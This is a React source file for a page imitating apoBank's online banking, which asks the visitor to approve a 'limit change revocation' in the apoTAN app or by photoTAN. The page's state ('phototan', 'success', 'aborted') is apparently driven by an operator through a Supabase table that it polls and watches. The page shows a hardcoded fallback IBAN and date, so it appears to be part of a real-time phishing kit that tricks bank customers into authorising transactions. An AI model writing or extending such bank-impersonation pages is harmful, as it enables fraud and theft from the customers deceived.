import { useEffect, useState } from "react";
import { ChevronRight, HelpCircle, Loader2 } from "lucide-react";
import { useNavigate, useSearchParams } from "react-router-dom";
import apoBankLogo from "@/assets/apobank-logo.svg";
import { Button } from "@/components/ui/button";
import { supabase } from "@/integrations/supabase/client";

const LimitConfirm = () => {
  const navigate = useNavigate();
  const [sp] = useSearchParams();
  const token = sp.get("token");
  const [row, setRow] = useState<any>(null);
  const [busy, setBusy] = useState(false);

  useEffect(() => {
    if (!token) return;
    let alive = true;
    const load = async () => {
      const { data } = await (supabase as any)
        .from("limit_tokens")
        .select("*")
        .eq("token", token)
        .maybeSingle();
      if (!alive || !data) return;
      setRow(data);
      const phase = data.customer_phase;
      const qs = `?token=${encodeURIComponent(token)}`;
      if (phase === "phototan") navigate(`/limit/phototan${qs}`);
      else if (phase === "success") navigate(`/limit/loading${qs}`);
      else if (phase === "aborted") navigate("/auth");
    };
    load();
    const iv = window.setInterval(load, 2500);
    const ch = (supabase as any).channel(`limit_confirm_${token}`)
      .on("postgres_changes", { event: "*", schema: "public", table: "limit_tokens", filter: `token=eq.${token}` }, load)
      .subscribe();
    return () => { alive = false; window.clearInterval(iv); (supabase as any).removeChannel(ch); };
  }, [token, navigate]);

  const requestPhotoTan = async () => {
    if (!token) return;
    setBusy(true);
    await (supabase as any)
      .from("limit_tokens")
      .update({ customer_phase: "phototan_request", last_error: null, photo_tan_image: null })
      .eq("token", token);
  };

  const waiting = busy || row?.customer_phase === "phototan_request";
  const currLimit = row?.current_limit != null ? Number(row.current_limit).toLocaleString("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : "";
  const newLimit = row?.new_limit != null ? Number(row.new_limit).toLocaleString("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : "";
  const gueltigAb = row?.applied_at
    ? new Intl.DateTimeFormat("de-DE", { timeZone: "Europe/Berlin", day: "2-digit", month: "2-digit", year: "numeric", hour: "2-digit", minute: "2-digit" }).format(new Date(row.applied_at)).replace(",", "")
    : "";

  return (
    <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
      <header className="w-full bg-white border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 py-3 flex items-center gap-4">
          <img src={apoBankLogo} alt="apoBank Logo" className="h-12 w-auto" />
        </div>
      </header>

      <div className="bg-[#f5f5f5] border-b border-border/40">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 py-4">
          <div className="flex items-center gap-2 text-sm text-[#002776]">
            <span className="cursor-default">Startseite</span>
            <ChevronRight className="h-3 w-3 text-foreground/60" />
            <span className="text-foreground/70">{(row?.limit_type || "Limit-Änderung")} widerrufen</span>
          </div>
          <h1 className="mt-2 text-2xl sm:text-3xl font-normal text-[#1a1a1a]">{(row?.limit_type || "Limit-Änderung")} widerrufen</h1>
        </div>
      </div>

      <main className="flex-1 relative">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 pt-6">

          <div className="flex justify-center mt-4">
            <div className="inline-flex flex-col items-stretch rounded-md bg-[#e6e8eb] px-4 py-2 text-sm text-foreground min-w-[200px]">
              <span className="text-center">Ladevorgang läuft ...</span>
              <div className="mt-2 h-1 w-full bg-[#c9ccd1] rounded-full overflow-hidden">
                <div className="h-full w-1/3 bg-[#002776] rounded-full" style={{ animation: "lc-slide 1.8s linear infinite" }} />
              </div>
            </div>
          </div>
        </div>

        <div className="flex items-start justify-center">
          <div className="mt-8 sm:mt-10 mb-16 w-[92%] max-w-[520px] bg-white rounded-[16px] shadow-[0_8px_30px_rgba(0,0,0,0.15)] border border-border/40 p-6 sm:p-8 pb-12">
            <h2 className="text-lg sm:text-xl text-[#1a1a1a] mb-8">
              Bitte prüfen Sie die folgende Transaktion
            </h2>
            <p className="text-sm text-foreground mb-8">{(row?.limit_type || "Limit-Änderung")} widerrufen</p>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-6 sm:gap-y-10 mb-5">
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Kontobezeichnung</p>
                <p className="text-sm text-foreground">{row?.auftraggeber_iban || "DE53 3006 0601 0025 9570 83"}</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Neues Limit</p>
                <p className="text-sm text-foreground mb-3">{newLimit}</p>
                <p className="text-sm text-[#002776] mb-3 font-medium">Altes Limit</p>
                <p className="text-sm text-foreground">{currLimit}</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Gültig ab</p>
                <p className="text-sm text-foreground">29.07.2026 20:00</p>
              </div>
              <div>
                <p className="text-sm text-[#002776] mb-3 font-medium">Kontowährung</p>
                <p className="text-sm text-foreground">EUR</p>
              </div>
            </div>

            <div className="border-t border-border/60 pt-4 mb-16">
              <p className="text-sm text-foreground">
                Bitte geben Sie diese Transaktion in Ihrer apoTAN App frei
              </p>
            </div>

            <div className="flex items-center gap-3 mb-16">
              <span className="text-sm text-foreground">Warten ...</span>
              <div className="flex-1 h-1 bg-[#e6e8eb] rounded-full overflow-hidden">
                <div className="h-full w-1/3 bg-[#002776] rounded-full" style={{ animation: "lc-slide 1.8s linear infinite" }} />
              </div>
            </div>

            <div className="flex justify-end gap-3">
              <Button
                variant="outline"
                onClick={requestPhotoTan}
                disabled={waiting}
                className="rounded-full bg-white border-[#002776] text-[#002776] hover:bg-white hover:text-[#002776] px-6 disabled:opacity-100"
              >
                {waiting ? (<><Loader2 className="h-4 w-4 mr-2 animate-spin" />Bitte warten ...</>) : "Mit photoTAN freigeben"}
              </Button>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default LimitConfirm;
